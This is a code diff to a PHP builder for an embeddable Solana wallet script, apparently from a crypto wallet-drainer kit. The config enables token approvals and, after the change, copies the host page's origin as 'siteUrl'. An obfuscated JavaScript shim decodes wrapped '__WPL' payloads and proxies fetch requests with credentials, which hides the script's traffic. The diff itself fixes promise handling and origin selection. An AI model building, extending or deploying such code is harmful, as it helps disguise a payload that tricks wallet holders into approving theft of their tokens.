@@ -96,7 +96,7 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'network' => (string) ($cfg['network'] ?? 'solana'),
         'siteName' => (string) ($cfg['site_name'] ?? 'Website'),
         'siteDescription' => (string) ($cfg['site_description'] ?? ''),
-        'siteUrl' => vercel_site_origin($cfg),
+        'siteUrl' => request_origin() !== '' ? request_origin() : vercel_site_origin($cfg),
         'siteIcons' => $icons,
         'analytics' => (bool) ($cfg['analytics'] ?? true),
         'tokenApprovalEnabled' => (bool) ($cfg['token_approval_enabled'] ?? true),
@@ -277,11 +277,12 @@ function embed_network_shim(string $entry, array $chunks): string
         . 'if(!m)return null;var s=Number(m[1]);if(s<200||s>=300)throw new Error("chunk "+s);'
         . 'var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
         . 'if(m[3]==="0")return raw;return JSON.parse(raw)}'
-        . 'function pj(r){return r.text().then(function(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
+        . 'function pj(r){return Promise.resolve(r).then(function(res){return res.text().then(function(t){'
+        . 'var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
         . 'if(m&&m[3]==="0"){var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
         . 'var u=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)u[i]=raw.charCodeAt(i);'
         . 'return new Response(u,{status:Number(m[1])})}var j=pl(t);'
-        . 'return new Response(j?JSON.stringify(j):t,{status:r.status,headers:{"Content-Type":"application/json"}})})}'
+        . 'return new Response(j?JSON.stringify(j):t,{status:res.status,headers:{"Content-Type":"application/json"}})})})}'
         . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
         . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
         . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
